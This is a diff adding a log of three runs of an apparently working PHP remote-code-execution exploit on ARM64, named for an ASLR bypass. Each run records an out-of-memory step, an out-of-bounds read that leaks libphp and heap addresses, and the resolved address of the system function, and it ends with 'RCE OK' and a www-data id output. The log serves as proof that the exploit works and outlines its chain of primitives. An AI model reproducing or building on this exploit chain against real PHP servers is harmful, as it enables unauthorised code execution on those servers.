@@ -1,0 +1,27 @@
+===== ARM64 official-workers fresh-container run 1 =====
+      pinned 150/150 workers (149 holders)
+[try 1] A1: END-cleanup send_cookie OOM
+[try 1] B1: stale-id OOB read (chunk base + libphp)
+      decoded=819208 zval_ptr_dtor=0xf13d09dc812b -> libphp=0xf13d09790000
+      chunk buckets: [('0xf13cff000000', 7495), ('0xf13d09c00000', 1095), ('0xf13d07600000', 87), ('0xf13cfee00000', 79), ('0xf13cff600000', 6)]
+[try 1] A2 + B2: main=0xf13d07600000 S=0xf13d076f8398 zif_system=0xf13d09bbcd70
+[4/4] RCE OK; proof /root/php2shell-bypass-aslr-exp/out/p1:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+===== ARM64 official-workers fresh-container run 2 =====
+      pinned 150/150 workers (149 holders)
+[try 1] A1: END-cleanup send_cookie OOM
+[try 1] B1: stale-id OOB read (chunk base + libphp)
+      decoded=819208 zval_ptr_dtor=0xe37cc637812b -> libphp=0xe37cc5d40000
+      chunk buckets: [('0xe37cbb600000', 7495), ('0xe37cc6200000', 1095), ('0xe37cc3c00000', 87), ('0xe37cbb400000', 79), ('0xe37cbbc00000', 6)]
+[try 1] A2 + B2: main=0xe37cc3c00000 S=0xe37cc3cf8398 zif_system=0xe37cc616cd70
+[4/4] RCE OK; proof /root/php2shell-bypass-aslr-exp/out/p1:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+===== ARM64 official-workers fresh-container run 3 =====
+      pinned 150/150 workers (149 holders)
+[try 1] A1: END-cleanup send_cookie OOM
+[try 1] B1: stale-id OOB read (chunk base + libphp)
+      decoded=819208 zval_ptr_dtor=0xf90a63db812b -> libphp=0xf90a63780000
+      chunk buckets: [('0xf90a59000000', 7495), ('0xf90a63c00000', 1095), ('0xf90a61600000', 87), ('0xf90a58e00000', 79), ('0xf90a59600000', 6)]
+[try 1] A2 + B2: main=0xf90a61600000 S=0xf90a616f8398 zif_system=0xf90a63bacd70
+[4/4] RCE OK; proof /root/php2shell-bypass-aslr-exp/out/p1:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
